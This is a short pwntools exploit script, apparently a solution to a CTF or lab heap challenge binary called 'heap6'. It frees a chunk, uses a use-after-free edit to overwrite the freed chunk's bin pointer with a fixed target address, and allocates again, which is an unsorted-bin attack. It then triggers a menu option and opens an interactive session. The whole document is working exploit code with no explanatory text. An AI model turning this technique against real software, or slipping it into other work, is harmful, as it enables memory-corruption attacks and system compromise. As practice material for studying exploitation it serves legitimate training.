from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']
elf = ELF('./heap6')

ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

# io = gdb.debug(['./heap6'], "b 43\nc")

io = process("./heap6")

def choice(p, idx):
    sla(p, "choice : ", str(idx))

def add(p, idx, size):
    choice(p, 1)
    sla(p, "idx plz : ", str(idx))
    sla(p, "size plz : ", str(size))

def rm(p, idx):
    choice(p, 2)
    sla(p, "idx plz : ", str(idx))

def show(p, idx):
    choice(p, 3)
    sla(p, "idx plz : ", str(idx))

def edit(p, idx, data):
    choice(p, 4)
    sla(p, "idx plz : ", str(idx))
    sa(p, "content plz : ", data)

target = 0x6029B8

add(io, 0, 0x100)
add(io, 1, 0x100)
rm(io, 0)

edit(io, 0, flat(0, target-0x10))

# gdb.attach(io, "b malloc")

add(io, 2, 0x100)

choice(io, 5)

io.interactive()